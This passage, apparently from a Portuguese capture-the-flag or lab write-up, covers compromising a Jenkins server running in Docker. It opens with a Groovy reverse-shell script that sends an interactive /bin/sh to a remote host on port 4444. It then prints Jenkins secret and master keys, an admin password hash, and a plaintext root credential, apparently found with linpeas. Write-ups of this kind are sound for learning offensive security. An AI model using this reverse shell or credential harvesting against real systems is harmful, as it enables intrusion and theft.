int port=4444;
String[] cmd = ["/bin/sh", "-i"] as String[];

Socket s=new Socket(host,port);
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();

InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();

while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
}

p.destroy();
s.close();
```

Com isso, consegui obter uma shell no sistema com sucesso.

![](attachment/9f699287efc5ba76a1da81a9a5da8d13.png)

## 5.2 Explorando o `Docker`

![](attachment/472c15ceca45ad0ee7ccb5eeac4709e0.png)

Acessei a pasta raiz do Jenkins em busca de informações sensíveis que pudessem revelar a senha do usuário root ou permitir a escalada de privilégios dentro do contêiner Docker.

> [!secret.key]
> ff9d7e137411b61679dfe34a2a385ee066fcd850d0b97cbb2c319c2b4cad125f


> [!master.key]
>5354f116835133ad1273b83a07d25e0eff524d19fcea2f5de32373169a7b0ef8b30e84a1b1b414e8bf9fc80f72f2ce6db34df700038fb76f73e74cd9ea4e8b3e998ed3f715e444ba6ada6ba9adce287001d496af0174a310a0ba90eec85f7d5bf092cace21f3fb76d9d8f96702897dae8b51c3f76c81b7db53c62c16360659bd

> [!/users/admin_3190494404640478712/config.xml]
> `<passwordHash>#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe</passwordHash>`

Executei o `linpeas.sh` na tentativa de identificar informações úteis, já que eu estava sem uma direção clara. Foi então que a ferramenta apontou um arquivo contendo uma senha em texto plano localizado na pasta `/opt`.

![](attachment/7113563788a148e37df8466aa85469a9.png)


> [!Credencial do Root]
> root:tr0ub13guM!@#123
